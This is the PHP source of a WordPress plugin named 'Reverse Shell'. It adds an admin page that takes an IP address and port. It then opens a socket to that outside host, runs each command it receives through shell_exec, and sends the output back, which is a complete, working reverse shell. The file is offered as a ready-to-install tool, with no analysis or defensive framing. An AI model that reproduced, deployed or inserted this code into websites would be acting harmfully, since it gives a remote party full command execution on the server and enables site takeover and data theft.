<?php
/**
 * Plugin Name: Reverse Shell
 * Description: A plugin that provides reverse shell functionality with GUI for configuration.
 * Version: 1.2
 * Author: 4m3rr0r
 */

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly
}

// Add menu to the WordPress dashboard
function reverse_shell_plugin_menu() {
    add_menu_page(
        'Reverse Shell', // Page Title
        'Reverse Shell', // Menu Title
        'manage_options', // Capability
        'reverse-shell', // Menu Slug
        'reverse_shell_settings_page', // Function to display the settings page
        'dashicons-networking' // Icon
    );
}
add_action('admin_menu', 'reverse_shell_plugin_menu');

// Settings page for reverse shell configuration
function reverse_shell_settings_page() {
    ?>
    <div class="wrap">
        <h1>Reverse Shell Configuration</h1>
        <form method="post" action="">
            <div class="rs-form-group">
                <label for="rs_ip">IP Address:</label>
                <input type="text" name="rs_ip" id="rs_ip" value="<?php echo esc_attr(get_option('rs_ip')); ?>" />
            </div>
            <div class="rs-form-group">
                <label for="rs_port">Port Number:</label>
                <input type="text" name="rs_port" id="rs_port" value="<?php echo esc_attr(get_option('rs_port')); ?>" />
            </div>
            <div class="rs-form-group">
                <input type="submit" name="rs_connect" value="Connect" class="button button-primary" />
            </div>
        </form>
    </div>

    <style>
        .rs-form-group {
            margin-bottom: 15px;
        }
        .rs-form-group label {
            font-weight: bold;
            margin-right: 10px;
        }
        .rs-form-group input {
            padding: 5px;
            width: 300px;
        }
        .rs-form-group input[type="submit"] {
            width: auto;
            background-color: #0073aa;
            color: white;
            border: none;
            cursor: pointer;
        }
        .rs-form-group input[type="submit"]:hover {
            background-color: #006799;
        }
    </style>
    <?php

    if (isset($_POST['rs_connect'])) {
        $ip = sanitize_text_field($_POST['rs_ip']);
        $port = sanitize_text_field($_POST['rs_port']);
        update_option('rs_ip', $ip);
        update_option('rs_port', $port);

        // Handle the reverse shell connection
        reverse_shell_connect($ip, $port);
    }
}

// Reverse shell connection function
function reverse_shell_connect($ip, $port) {
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        echo '<div class="error"><p>Failed to connect: ' . htmlspecialchars($errstr) . ' (' . htmlspecialchars($errno) . ')</p></div>';
    } else {
        echo '<div class="updated"><p>Connected to ' . htmlspecialchars($ip) . ':' . htmlspecialchars($port) . '</p></div>';
        // Create a reverse shell
        while (!feof($sock)) {
            $cmd = fread($sock, 2048);
            $output = shell_exec($cmd);
            fwrite($sock, $output);
        }
        fclose($sock);
    }
}

// Plugin activation hook
function reverse_shell_plugin_activation() {
    add_option('rs_ip', '127.0.0.1');
    add_option('rs_port', '4444');
}
register_activation_hook(__FILE__, 'reverse_shell_plugin_activation');

// Plugin deactivation hook
function reverse_shell_plugin_deactivation() {
    delete_option('rs_ip');
    delete_option('rs_port');
}
register_deactivation_hook(__FILE__, 'reverse_shell_plugin_deactivation');

